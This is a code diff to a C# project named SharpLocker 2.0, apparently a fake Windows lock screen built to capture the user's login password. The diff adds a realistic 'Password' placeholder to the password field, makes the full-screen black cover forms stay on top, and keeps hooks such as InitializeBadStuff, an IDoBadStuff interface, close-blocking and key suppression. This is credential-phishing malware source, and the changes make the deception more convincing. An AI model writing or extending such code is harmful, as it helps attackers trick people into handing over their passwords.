@@ -14,6 +14,8 @@ namespace SharpLocker_2._0
         private bool DenyClose { get; set; }
         private Interfaces.IDoBadStuff DoBadStuff;
 
+        private const string PLACEHOLDER_TEXT = "Password";
+
         public WindowsLogin()
         {
             InitializeComponent();
@@ -44,6 +46,7 @@ namespace SharpLocker_2._0
         private void LoginButton_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
+            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
 
             DenyClose = false;
             KeyPressHandler.Enable();
@@ -53,11 +56,57 @@ namespace SharpLocker_2._0
             Close();
         }
 
+        #region "Password"
+
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
-            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();
             CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
+            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();
+
+            if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
+            {
+                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
+                {
+                    PasswordTextBox.Select(0, 0);
+                    e.Handled = true;
+                }
+            }
         }
+
+        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
+        {
+            TextBox tb = (TextBox)sender;
+
+            if (string.IsNullOrEmpty(tb.Text))
+            {
+                SetPlaceholder();
+            }
+
+            if (tb.Text.Substring(1, tb.Text.Length - 1) == PLACEHOLDER_TEXT)
+            {
+                tb.UseSystemPasswordChar = true;
+                tb.Font = new Font("Microsoft Sans Serif", 23.25f);
+                tb.Text = tb.Text.Substring(tb.Text.Length - 1);
+                tb.ForeColor = SystemColors.WindowFrame;
+                tb.Select(1, 0);
+            }
+        }
+
+        private void PasswordTextBox_Click(object sender, EventArgs e)
+        {
+            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
+        }
+
+        private void SetPlaceholder()
+        {
+            PasswordTextBox.UseSystemPasswordChar = false;
+            PasswordTextBox.Text = PLACEHOLDER_TEXT;
+            PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
+            PasswordTextBox.ForeColor = SystemColors.ControlLight;
+            PasswordTextBox.Select(0, 0);
+        }
+
+        #endregion
 
         #region "Init"
 
@@ -69,15 +118,25 @@ namespace SharpLocker_2._0
 
         private void Initialize()
         {
-            DenyClose = true;
-            CapsLockLabel.Visible = false;
-
+            InitializeMisc();
+            InitializePasswordTextbox();
             InitializeTaskbar();
             InitializeUserLabel();
             InitializeUserIcon();
             InitializeBackground();
             InitializeBadStuff();
             InitializeOtherScreens();
+        }
+
+        private void InitializeMisc()
+        {
+            DenyClose = true;
+            CapsLockLabel.Visible = false;
+        }
+
+        private void InitializePasswordTextbox()
+        {
+            SetPlaceholder();
         }
 
         private void InitializeBadStuff()
@@ -117,7 +176,6 @@ namespace SharpLocker_2._0
 
         private void InitializeUserIcon()
         {
-
             UserIconPictureBox.Image = GetUserIconFromPath("bmp");
 
             if (UserIconPictureBox.Image is null)
@@ -170,7 +228,8 @@ namespace SharpLocker_2._0
                 WindowState = FormWindowState.Maximized,
                 StartPosition = FormStartPosition.Manual,
                 FormBorderStyle = FormBorderStyle.None,
-                BackColor = Color.Black
+                BackColor = Color.Black,
+                TopMost = true
             };
 
             blackForm.FormClosing += WindowsLogin_FormClosing;
